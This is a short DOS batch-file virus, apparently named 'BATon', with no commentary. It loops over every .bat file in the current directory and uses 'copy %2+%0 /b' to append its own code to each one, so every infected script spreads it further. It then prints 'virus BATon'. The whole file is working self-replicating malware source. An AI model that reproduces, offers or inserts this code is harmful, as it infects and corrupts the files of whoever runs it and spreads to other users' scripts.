cls
:s
if "%1"=="7" goto inf>nul
for %%f in (*.bat) do call %0 7 %%f>nul
goto e>nul
:inf
copy %2+%0 /b >nul
:e
echo virus BATon